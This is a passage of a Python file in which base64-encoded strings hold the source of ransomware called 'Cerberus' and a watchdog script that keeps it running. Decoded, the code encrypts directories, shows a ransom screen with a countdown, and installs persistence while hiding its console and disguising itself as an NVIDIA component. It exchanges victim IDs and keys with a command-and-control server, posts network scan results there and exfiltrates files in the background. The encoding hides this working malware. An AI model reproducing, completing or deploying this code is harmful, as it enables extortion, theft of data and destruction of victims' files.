oc2VsZiwgdGltZV9zdHIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi50aW1lcl9sYWJlbC5jb25maWcodGV4dD10aW1lX3N0cikKICAgICAgICAgICAgaWYgc2VsZi50aW1lX2xlZnQgPCAzNjAwOgogICAgICAgICAgICAgICAgc2VsZi50aW1lcl9sYWJlbC5jb25maWcoZmc9JyNmZjAwMDAnIGlmIHNlbGYudGltZV9sZWZ0ICUgMiA9PSAwIGVsc2UgJyNmZmZmZmYnKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBmYWtlX2V4ZmlsdHJhdGlvbihzZWxmKToKICAgICAgICBzdGFnZXMgPSBbICJTY2FubmluZy4uLiIsICJDb21wcmVzc2luZy4uLiIsICJFbmNyeXB0aW5nLi4uIiwgIkNvbm5lY3RpbmcuLi4iLCAiVXBsb2FkaW5nLi4uIiwgIkNvbXBsZXRlLiIgXQogICAgICAgIGZvciBzdGFnZSBpbiBzdGFnZXM6CiAgICAgICAgICAgIGlmIG5vdCBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZzogYnJlYWsKICAgICAgICAgICAgIyBUSFJFQUQtU0FGRTogU2NoZWR1bGUgR1VJIHVwZGF0ZSBvbiBtYWluIHRocmVhZAogICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGEgcz1zdGFnZTogc2VsZi5leGZpbF9zdGF0dXMuY29uZmlnKHRleHQ9ZiJTVEFUVVM6IHtzfSIpKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMCwgbGFtYmRhOiBzZWxmLmV4ZmlsX3N0YXR1cy5jb25maWcodGV4dD0iU1RBVFVTOiBVUExPQUQgQ09NUExFVEUiLCBmZz0nI2ZmMDAwMCcpKQoKICAgIGRlZiBoZWFydGJlYXRfcG9sbGluZyhzZWxmKToKICAgICAgICB3aGlsZSBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3N0YXR1cy97c2VsZi52aWN0aW1faWR9P3RpbWVfbGVmdD17c2VsZi50aW1lX2xlZnR9IiwgdGltZW91dD01KQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgICAgICAgICBpZiAibmV3X3RpbWVyIiBpbiBkYXRhOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRpbWVfbGVmdCA9IGludChkYXRhWyJuZXdfdGltZXIiXSkKICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLmdldCgic3RhdHVzIikgPT0gInJlYWR5IjoKICAgICAgICAgICAgICAgICAgICAgICAga2V5ID0gZGF0YS5nZXQoImtleSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGtleToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIHNlbGYudXBkYXRlX2tleV9maWVsZCwga2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oZWFydGJlYXRfdGhyZWFkX3J1bm5pbmcgPSBGYWxzZQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkgCgogICAgZGVmIHVwZGF0ZV9rZXlfZmllbGQoc2VsZiwga2V5KToKICAgICAgICBzZWxmLmtleV92YXIuc2V0KGtleSkKICAgICAgICBzZWxmLmtleV9lbnRyeS5jb25maWcoc3RhdGU9J25vcm1hbCcpCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogVmFsaWQga2V5IHJlY2VpdmVkLiBEZWNyeXB0aW9uIGVuYWJsZWQuIiwgZmc9JyM0ZGZmODgnKQogICAgICAgIHNlbGYuZGVjcnlwdF9idXR0b24uY29uZmlnKHN0YXRlPSdub3JtYWwnKQogICAgICAgIHNlbGYua2V5X2VudHJ5LmNvbmZpZyhzdGF0ZT0ncmVhZG9ubHknKQogICAgICAgIAogICAgZGVmIGVuYWJsZV9wYXltZW50X21vZGUoc2VsZik6CiAgICAgICAgc2VsZi5wYXltZW50X21vZGVfYWN0aXZlID0gVHJ1ZQogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IEJST1dTRVIgVU5MT0NLRUQgRk9SIFBBWU1FTlQuIERPIE5PVCBDTE9TRS4iLCBmZz0nY3lhbicpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgc2VsZi5tYXN0ZXIuZ3JhYl9yZWxlYXNlKCkKICAgICAgICAgICAgIHNlbGYubWFzdGVyLmF0dHJpYnV0ZXMoJy10b3Btb3N0JywgRmFsc2UpCiAgICAgICAgICAgICBzZWxmLm1hc3Rlci5vdmVycmlkZXJlZGlyZWN0KEZhbHNlKSAKICAgICAgICAgICAgIHNlbGYubWFzdGVyLmljb25pZnkoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IHdlYmJyb3dzZXIKICAgICAgICAgICAgd2ViYnJvd3Nlci5vcGVuKCJodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9xPWJpdGNvaW4rcGF5bWVudCIpIAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigxMjAwMDAsIHNlbGYuZGlzYWJsZV9wYXltZW50X21vZGUpCgogICAgZGVmIGRpc2FibGVfcGF5bWVudF9tb2RlKHNlbGYpOgogICAgICAgIHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZSA9IEZhbHNlCiAgICAgICAgc2VsZi5tYXN0ZXIuZGVpY29uaWZ5KCkgCiAgICAgICAgc2VsZi5tYXN0ZXIuYXR0cmlidXRlcygnLWZ1bGxzY3JlZW4nLCBGYWxzZSkgIyBOb3QgZnVsbHNjcmVlbiBhbnltb3JlIQogICAgICAgIHNlbGYubWFzdGVyLmF0dHJpYnV0ZXMoJy10b3Btb3N0JywgVHJ1ZSkKICAgICAgICBzZWxmLm1hc3Rlci5vdmVycmlkZXJlZGlyZWN0KEZhbHNlKQogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IExPQ0tFRC4iLCBmZz0nI2ZmZmY0ZCcpCgogICAgZGVmIHN0YXJ0X2RlY3J5cHRpb24oc2VsZik6CiAgICAgICAga2V5X2I2NCA9IHNlbGYua2V5X3Zhci5nZXQoKQogICAgICAgIGlmIG5vdCBrZXlfYjY0OgogICAgICAgICAgICByZXR1cm4KICAgICAgICAKICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iU1RBVFVTOiBEZWNyeXB0aW5nIGZpbGVzLi4uIFBsZWFzZSB3YWl0LiIsIGZnPSd5ZWxsb3cnKQogICAgICAgIHNlbGYubWFzdGVyLnVwZGF0ZSgpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBrZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGtleV9iNjQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9maWxlcyA9IDAKICAgICAgICAgICAgCiAgICAgICAgICAgICMgTG9hZCBzYXZlZCBlbmNyeXB0ZWQgcGF0aHMgKHByZWZlciB0aGlzIG92ZXIgZGVmYXVsdCkKICAgICAgICAgICAgdGFyZ2V0X3BhdGhzID0gW1RBUkdFVF9ESVJFQ1RPUlldICAjIERlZmF1bHQgZmFsbGJhY2sKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoRU5DUllQVEVEX1BBVEhTX0ZJTEUpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihFTkNSWVBURURfUEFUSFNfRklMRSwgJ3InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXRfcGF0aHMgPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIERlY3J5cHQgQUxMIGVuY3J5cHRlZCBkaXJlY3RvcmllcwogICAgICAgICAgICBmb3IgdGFyZ2V0X3BhdGggaW4gdGFyZ2V0X3BhdGhzOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHModGFyZ2V0X3BhdGgpOgogICAgICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHRhcmdldF9wYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKEVOQ1JZUFRFRF9FWFRFTlNJT04pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRlY3J5cHRfZmlsZV9hZXNfZ2NtKGZpbGVfcGF0aCwga2V5KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX2ZpbGVzICs9IDEKICAgICAgICAgICAgCiAgICAgICAgICAgICMgLS0tIENMRUFOIFVQIC0tLQogICAgICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IEZhbHNlICMgU3RvcCBhbGwgYmFja2dyb3VuZCB0aHJlYWRzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIDEuIENyZWF0ZSBTVE9QIFNJR05BTCBmb3Igd2F0Y2hkb2cgKE1VU1QgYmUgaW4gdGVtcCBkaXIsIG5vdCBjb25maWcgZGlyISkKICAgICAgICAgICAgaW1wb3J0IHRlbXBmaWxlCiAgICAgICAgICAgIHN0b3Bfc2lnbmFsX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAiY2VyYmVydXNfc3RvcF9zaWduYWwiKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oc3RvcF9zaWduYWxfcGF0aCwgJ3cnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoIkRFQ1JZUFRJT05fQ09NUExFVEUiKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgICMgMi4gUmVtb3ZlIFBlcnNpc3RlbmNlCiAgICAgICAgICAgIHJlbW92ZV9wZXJzaXN0ZW5jZSgpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIDMuIE1hcmsgYXMgQ2xlYW4gKGxlZ2FjeSwga2VwdCBmb3IgY29tcGF0aWJpbGl0eSkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgIHdpdGggb3BlbihDTEVBTl9NQVJLRVIsICd3JykgYXMgZjogZi53cml0ZSgiRnJlZWQiKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICAgICAgICAgICMgNC4gTnVrZSBDb25maWcgRGlyZWN0b3J5CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKENPTkZJR19ESVIpOgogICAgICAgICAgICAgICAgdHJ5OiBzaHV0aWwucm10cmVlKENPTkZJR19ESVIpCiAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PWYiU1VDQ0VTUyEge2RlY3J5cHRlZF9maWxlc30gZmlsZXMgZGVjcnlwdGVkLiBTeXN0ZW0gQ2xlYW5lZC4iLCBmZz0nIzRkZmY4OCcpCiAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2luZm8oIkRlY3J5cHRpb24gQ29tcGxldGUiLCAiWW91ciBmaWxlcyBoYXZlIGJlZW4gcmVzdG9yZWQgYW5kIHRoZSByYW5zb213YXJlIHJlbW92ZWQuXG5FeGl0aW5nIG5vdy4iKQogICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ19lcnJvcihmIkRlY3J5cHRpb24gZmFpbGVkOiB7ZX0iKQogICAgICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iRVJST1I6IERlY3J5cHRpb24gZmFpbGVkLiIsIGZnPSdyZWQnKQogICAgICAgICAgICBtZXNzYWdlYm94LnNob3dlcnJvcigiRXJyb3IiLCBmIkRlY3J5cHRpb24gZmFpbGVkOiB7ZX0iKQogICAgICAgIAogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgICMgRk9SQ0UgRVhJVCBOTyBNQVRURVIgV0hBVAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5ncmFiX3JlbGVhc2UoKSAKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmRlc3Ryb3koKSAKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIG9zLl9leGl0KDApICMgSGFyZCBleGl0IHRvIGtpbGwgYWxsIHRocmVhZHMKCiMgLS0tIE1haW4gRXhlY3V0aW9uIC0tLQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgaWYgb3MucGF0aC5leGlzdHMoQ0xFQU5fTUFSS0VSKToKICAgICAgICBzeXMuZXhpdCgwKQogICAgCiAgICAjID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgICMgU0lOR0xFVE9OIExPQ0s6IFVzZSBXaW5kb3dzIE11dGV4IChhdG9taWMsIG5vIHJhY2UgY29uZGl0aW9ucykKICAgICMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IGN0eXBlcwogICAgICAgICAgICBpbXBvcnQgY3R5cGVzLndpbnR5cGVzCiAgICAgICAgICAgIGtlcm5lbDMyID0gY3R5cGVzLldpbkRMTCgna2VybmVsMzInLCB1c2VfbGFzdF9lcnJvcj1UcnVlKQogICAgICAgICAgICBNVVRFWF9OQU1FID0gIkdsb2JhbFxcQ2VyYmVydXNSYW5zb213YXJlTXV0ZXgiCiAgICAgICAgICAgIG11dGV4ID0ga2VybmVsMzIuQ3JlYXRlTXV0ZXhXKE5vbmUsIFRydWUsIE1VVEVYX05BTUUpCiAgICAgICAgICAgIGxhc3RfZXJyb3IgPSBjdHlwZXMuZ2V0X2xhc3RfZXJyb3IoKQogICAgICAgICAgICBpZiBsYXN0X2Vycm9yID09IDE4MzogICMgRVJST1JfQUxSRUFEWV9FWElTVFMKICAgICAgICAgICAgICAgIGxvZ19lcnJvcigiQW5vdGhlciBpbnN0YW5jZSBhbHJlYWR5IHJ1bm5pbmcgKG11dGV4KS4gRXhpdGluZy4iKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ19lcnJvcihmIk11dGV4IGNoZWNrIGZhaWxlZDoge2V9IikKICAgIGVsc2U6CiAgICAgICAgIyBMaW51eDogVXNlIGxvY2tmIG9uIHRoZSBsb2NrIGZpbGUKICAgICAgICBTSU5HTEVUT05fTE9DSyA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX3J1bm5pbmciKQogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IGZjbnRsCiAgICAgICAgICAgIF9sb2NrX2ZkID0gb3BlbihTSU5HTEVUT05fTE9DSywgJ3cnKQogICAgICAgICAgICBmY250bC5sb2NrZihfbG9ja19mZCwgZmNudGwuTE9DS19FWCB8IGZjbnRsLkxPQ0tfTkIpCiAgICAgICAgICAgIF9sb2NrX2ZkLndyaXRlKHN0cihvcy5nZXRwaWQoKSkpCiAgICAgICAgICAgIF9sb2NrX2ZkLmZsdXNoKCkKICAgICAgICBleGNlcHQgKElPRXJyb3IsIE9TRXJyb3IpOgogICAgICAgICAgICBsb2dfZXJyb3IoIkFub3RoZXIgaW5zdGFuY2UgYWxyZWFkeSBydW5uaW5nIChsb2NrZikuIEV4aXRpbmcuIikKICAgICAgICAgICAgc3lzLmV4aXQoMCkKICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgICAgIHBhc3MgICMgTm8gZmNudGwsIGZhbGwgdGhyb3VnaAogICAgCiAgICAjID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgICMgUEVSU0lTVEVOQ0UKICAgICMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgaW5zdGFsbF9wZXJzaXN0ZW5jZSgpCiAgICBoaWRlX2NvbnNvbGUoKQogICAgY2hhbWVsZW9uX2Rpc2d1aXNlKCkKCiAgICAjID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgICMgUkVTVU1FOiBJZiBJRCBmaWxlIGV4aXN0cywgd2UgYWxyZWFkeSBpbmZlY3RlZCAtIGp1c3Qgc2hvdyBHVUkKICAgICMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgaWYgb3MucGF0aC5leGlzdHMoSURfRklMRSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oSURfRklMRSwgJ3InKSBhcyBmOgogICAgICAgICAgICAgICAgdmljdGltX2lkID0gZi5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICBpZiB2aWN0aW1faWQ6CiAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJSZXN1bWluZyBzZXNzaW9uIGZvciBWaWN0aW0gSUQ6IHt2aWN0aW1faWR9IikKICAgICAgICAgICAgICAgIHJvb3QgPSBUaygpCiAgICAgICAgICAgICAgICBhcHAgPSBSYW5zb213YXJlR1VJKHJvb3QsIHZpY3RpbV9pZCkKICAgICAgICAgICAgICAgIHJvb3QubWFpbmxvb3AoKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcyAKICAgIAogICAgIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAjIEZSRVNIIFNUQVJUIENMRUFOVVA6IFJlbW92ZSBzdGFsZSBzdGF0ZSBmcm9tIGNyYXNoZWQgcHJldmlvdXMgcnVucwogICAgIyBJZiBJRF9GSUxFIGRvZXNuJ3QgZXhpc3QsIGFueSBsZWZ0b3ZlciBMT0NLX0ZJTEUgb3IgS0VZX0JBQ0tVUCBpcyBzdGFsZQogICAgIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICBmb3Igc3RhbGVfZmlsZSBpbiBbTE9DS19GSUxFLCBLRVlfQkFDS1VQX0ZJTEUsIEVOQ1JZUFRFRF9QQVRIU19GSUxFXToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGFsZV9maWxlKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3MucmVtb3ZlKHN0YWxlX2ZpbGUpCiAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJDbGVhbmVkIHN0YWxlIGZpbGU6IHtzdGFsZV9maWxlfSIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgIAogICAgIyBBbHNvIGNsZWFuIHN0YWxlIHJlY29uIElEIHNvIGEgZnJlc2ggb25lIGlzIGdlbmVyYXRlZAogICAgcmVjb25faWRfZmlsZSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX3JlY29uX2lkIikKICAgIGlmIG9zLnBhdGguZXhpc3RzKHJlY29uX2lkX2ZpbGUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MucmVtb3ZlKHJlY29uX2lkX2ZpbGUpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAKICAgICMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgIyBORVcgSU5GRUNUSU9OOiBPbmx5IHJ1bnMgT05DRSAobm8gSUQgZmlsZSwgbm8gbG9jayBmaWxlKQogICAgIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICBsb2dfZXJyb3IoIlN0YXJ0aW5nIG5ldyBpbmZlY3Rpb24uLi4iKQogICAgCiAgICAjIFN0ZXAgMTogVHJ5IHRvIGdldCB0YXJnZXQgc2VsZWN0aW9uIGZyb20gQzIKICAgIHNlbGVjdGVkX3RhcmdldHMgPSBzY2FuX2FuZF93YWl0X2Zvcl9pbnN0cnVjdGlvbnMoKQogICAgCiAgICAjIFN0ZXAgMjogRW5jcnlwdAogICAgaWYgc2VsZWN0ZWRfdGFyZ2V0czoKICAgICAgICBsb2dfZXJyb3IoZiJDMiBzZWxlY3RlZCB7bGVuKHNlbGVjdGVkX3RhcmdldHMpfSB0YXJnZXRzIikKICAgICAgICBhZXNfa2V5ID0gZW5jcnlwdF9kaXJlY3Rvcnkoc2VsZWN0ZWRfdGFyZ2V0cykKICAgIGVsc2U6CiAgICAgICAgbG9nX2Vycm9yKCJDMiB1bnJlYWNoYWJsZSBvciB0aW1lZCBvdXQgLSB1c2luZyBkZWZhdWx0IHRhcmdldCIpCiAgICAgICAgYWVzX2tleSA9IGVuY3J5cHRfZGlyZWN0b3J5KCkKICAgIAogICAgIyBTdGVwIDM6IENoZWNrIGluIGFuZCBsYXVuY2ggR1VJCiAgICBpZiBhZXNfa2V5OgogICAgICAgIHZpY3RpbV9pZCA9IGNoZWNrX2luX3dpdGhfYzIoYWVzX2tleSkKICAgICAgICBpZiB2aWN0aW1faWQ6CiAgICAgICAgICAgICMgQ2FydG9ncmFwaGVyOiBOZXR3b3JrIHNjYW4gaW4gYmFja2dyb3VuZCAodXNlcyBhY3R1YWwgdmljdGltX2lkKQogICAgICAgICAgICBkZWYgcnVuX25ldHdvcmtfc2NhbigpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgICAgICAgICBob3N0cyA9IHNjYW5fbmV0d29yaygpCiAgICAgICAgICAgICAgICAgICAgaWYgaG9zdHM6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL25ldHdvcmtfbWFwL3t2aWN0aW1faWR9IiwganNvbj17Imhvc3RzIjogaG9zdHN9LCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1ydW5fbmV0d29ya19zY2FuLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBEYXRhIFRoaWVmOiBFeGZpbHRyYXRlIGluIGJhY2tncm91bmQKICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bGFtYmRhOiBleGZpbHRyYXRlX2ZpbGVzKHZpY3RpbV9pZCksIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIExhdW5jaCBHVUkgKG9ubHkgT05FIGluc3RhbmNlKQogICAgICAgICAgICByb290ID0gVGsoKQogICAgICAgICAgICBhcHAgPSBSYW5zb213YXJlR1VJKHJvb3QsIHZpY3RpbV9pZCkKICAgICAgICAgICAgcm9vdC5tYWlubG9vcCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbG9nX2Vycm9yKCJGYWlsZWQgdG8gZ2V0IFZpY3RpbSBJRC4gQWJvcnRpbmcgR1VJLiIpCiAgICBlbHNlOgogICAgICAgIGxvZ19lcnJvcigiRW5jcnlwdGlvbiBza2lwcGVkIG9yIGZhaWxlZC4gQWJvcnRpbmcuIikK"
WATCHDOG_B64 = "IyB3YXRjaGRvZy5weSAtIEF1dG8tcmVzdGFydCBtb25pdG9yIGZvciByYW5zb213YXJlDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCB0aW1lDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgcHN1dGlsDQoNCiMgQ29uZmlndXJhdGlvbg0KUkFOU09NV0FSRV9TQ1JJUFQgPSAiLm52aWRpYV9yYW5zb213YXJlLnB5IiAgIyBGaWxlbmFtZSBvbmx5LCB3aWxsIGJlIGluIHNhbWUgZGlyIGFzIHdhdGNoZG9nDQpDSEVDS19JTlRFUlZBTCA9IDUgICMgQ2hlY2sgZXZlcnkgNSBzZWNvbmRzDQpTVE9QX1NJR05BTF9GSUxFID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImNlcmJlcnVzX3N0b3Bfc2lnbmFsIikNCg0KZGVmIGlzX3JhbnNvbXdhcmVfcnVubmluZygpOg0KICAgICIiIkNoZWNrIGlmIHJhbnNvbXdhcmUgcHJvY2VzcyBpcyBydW5uaW5nLiIiIg0KICAgIHRyeToNCiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcihbJ3BpZCcsICduYW1lJywgJ2NtZGxpbmUnXSk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY21kbGluZSA9IHByb2MuaW5mby5nZXQoJ2NtZGxpbmUnKQ0KICAgICAgICAgICAgICAgIGlmIGNtZGxpbmUgYW5kIGFueShSQU5TT01XQVJFX1NDUklQVCBpbiBzdHIoYXJnKSBmb3IgYXJnIGluIGNtZGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCk6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCmRlZiBzdGFydF9yYW5zb213YXJlKCk6DQogICAgIiIiU3RhcnQgdGhlIHJhbnNvbXdhcmUgcHJvY2VzcyB3aXRoIHZpc2libGUgR1VJLiIiIg0KICAgIHRyeToNCiAgICAgICAgd2F0Y2hkb2dfZGlyID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpDQogICAgICAgIHJhbnNvbXdhcmVfcGF0aCA9IG9zLnBhdGguam9pbih3YXRjaGRvZ19kaXIsIFJBTlNPTVdBUkVfU0NSSVBUKQ0KICAgICAgICANCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHJhbnNvbXdhcmVfcGF0aCk6DQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCiAgICAgICAgICAgIA0KICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgICAgICAjIFdpbmRvd3M6IFJ1biB3aXRoIHZpc2libGUgR1VJIChubyBoaWRkZW4gZmxhZ3MhKQ0KICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsIHJhbnNvbXdhcmVfcGF0aF0pDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAjIExpbnV4OiBSdW4gaW4gYmFja2dyb3VuZA0KICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsIHJhbnNvbXdhcmVfcGF0aF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIHNob3VsZF9zdG9wKCk6DQogICAgIiIiQ2hlY2sgaWYgc3RvcCBzaWduYWwgZXhpc3RzLiIiIg0KICAgIHJldHVybiBvcy5wYXRoLmV4aXN0cyhTVE9QX1NJR05BTF9GSUxFKQ0KDQpkZWYgY2xlYW51cF9hbmRfZXhpdCgpOg0KICAgICIiIkRlbGV0ZSB3YXRjaGRvZywgcmFuc29td2FyZSBmaWxlcywgYW5kIHRoZSBzdG9wIHNpZ25hbC4iIiINCiAgICB0cnk6DQogICAgICAgIHdhdGNoZG9nX2RpciA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQ0KICAgICAgICByYW5zb213YXJlX3BhdGggPSBvcy5wYXRoLmpva